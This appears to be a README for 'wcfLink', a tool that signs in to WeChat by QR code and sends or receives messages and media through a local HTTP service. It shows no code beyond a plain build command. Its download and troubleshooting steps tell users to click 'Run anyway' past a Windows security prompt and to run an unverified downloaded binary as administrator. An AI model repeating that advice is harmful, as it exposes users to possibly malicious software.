# 🧩 wcfLink - Run WeChat Link on Windows

[![Download wcfLink](https://img.shields.io/badge/Download-wcfLink-0078D4?style=for-the-badge&logo=github)](https://github.com/dasiedeterrent692/wcfLink)

## 📥 Download

1. Open this page: [https://github.com/dasiedeterrent692/wcfLink](https://github.com/dasiedeterrent692/wcfLink)
2. Look for the latest Windows release or build file
3. Download the file to your computer
4. If you get a `.zip` file, right-click it and choose **Extract All**
5. Open the extracted folder
6. Double-click the app file to start it

If you see a Windows security prompt, choose **Run anyway** if you trust the file and want to continue.

## 🪟 What this app does

`wcfLink` lets you connect to the iLink WeChat channel in a local app or HTTP service. For a normal Windows user, this means you can start the tool on your computer and use it to:

- Scan a QR code to sign in
- Check whether you are still signed in
- Keep a signed-in account on the machine
- Send text messages
- Send pictures, videos, and files
- Receive pictures, voice messages, videos, and files and save them locally
- Store local events
- Use a local HTTP API
- Keep status data in SQLite

## ✅ Before you start

Make sure your computer has:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free space for the app and saved media files
- Permission to run downloaded files on your PC

If you plan to use the local service mode, keep the app running while you use it.

## 🚀 Run on Windows

### Option 1: Use the desktop app

If you downloaded the GUI version from the linked project:

1. Open the downloaded file or extracted folder
2. Find the app file
3. Double-click it
4. Wait for the window to open
5. Scan the QR code with your account
6. Keep the app open while you use it

### Option 2: Run the local service

If you downloaded the command-line version:

1. Open the folder where the file was saved
2. Start the app
3. Wait for it to finish loading
4. Use the local address shown by the app
5. Leave the app open while you work

The default local address is:

127.0.0.1:17890

## 🔐 Sign in

To sign in:

1. Start the app
2. Find the QR code on screen
3. Open WeChat on your phone
4. Scan the QR code
5. Confirm the sign-in on your phone
6. Wait until the app shows that sign-in is complete

If the app shows a login state check, wait a moment and let it finish.

## 📡 Use the local HTTP service

If you use the HTTP mode, the app runs on your own computer and answers local requests.

You can use it to:

- Check sign-in status
- Send messages
- Receive message updates
- Handle media files
- Read stored event data

Use the local address below in your browser or in a local tool:

127.0.0.1:17890

## 🗂 File storage

The app saves some data on your computer, such as:

- Login state
- Event records
- Received media files
- SQLite data

Keep enough disk space free if you plan to receive many files.

## 🧭 Main parts of the project

These parts are useful if you want to know how the app works:

- Public entry: `engine/engine.go`
- App entry: `cmd/wcfLink/main.go`
- App service: `internal/app/app.go`
- WeChat protocol: `internal/ilink/client.go`
- Media handling: `internal/ilink/media.go`
- Storage: `internal/store/store.go`
- HTTP server: `internal/httpapi/server.go`
- Polling worker: `internal/worker/poller.go`

## 🛠 System needs

This project works best with:

- Go 1.25 or newer if you build it yourself
- SQLite for local data storage
- Windows for normal desktop use
- A modern browser if you want to open local pages or check the service

If you only want to run the app, you do not need to install Go.

## 🧩 Build from source

If you want to build it yourself:

1. Install Go 1.25 or newer
2. Open a command window in the project folder
3. Run the build command:

```bash
go build -o ./bin/wcfLink ./cmd/wcfLink
```

4. Start the app:

```bash
./bin/wcfLink
```

## 📁 Project layout

- `engine/engine.go` - main entry for the core library
- `cmd/wcfLink/main.go` - app startup file
- `internal/app/app.go` - app control logic
- `internal/ilink/client.go` - connection logic
- `internal/ilink/media.go` - media transfer logic
- `internal/store/store.go` - local storage
- `internal/httpapi/server.go` - HTTP service
- `internal/worker/poller.go` - update polling

## 🖱 Common tasks

### Start the app

1. Open the app file
2. Wait for it to load
3. Scan the QR code if asked

### Check sign-in

1. Open the app
2. Look for the login status
3. Wait for the status to refresh

### Send a file

1. Open the sending screen or use the local service
2. Choose the file
3. Confirm the send action

### Receive files

1. Keep the app running
2. Wait for the other side to send a file
3. Check the local save folder

## 🔎 Troubleshooting

### The app does not open

- Make sure you extracted the zip file first
- Right-click the file and choose **Run as administrator**
- Check whether Windows blocked the file

### The QR code does not load

- Check your internet connection
- Close the app and open it again
- Wait a few seconds for the page to refresh

### Sign-in fails

- Scan the code again
- Confirm the sign-in on your phone
- Make sure the account is still valid

### Files do not save

- Check disk space
- Make sure the app has file access
- Restart the app and try again

## 📌 Source link

Download or visit the project here:

https://github.com/dasiedeterrent692/wcfLink